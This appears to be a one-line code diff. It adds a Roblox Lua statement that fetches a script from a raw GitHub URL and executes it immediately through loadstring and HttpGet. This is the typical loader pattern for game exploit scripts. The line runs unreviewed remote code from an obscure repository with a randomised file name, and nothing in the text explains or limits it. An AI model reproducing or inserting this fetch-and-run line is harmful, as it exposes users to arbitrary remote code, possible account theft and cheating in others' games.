@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/upd-5-noob-incremental-spam7-5qkh87omo18p0d.lua"))()
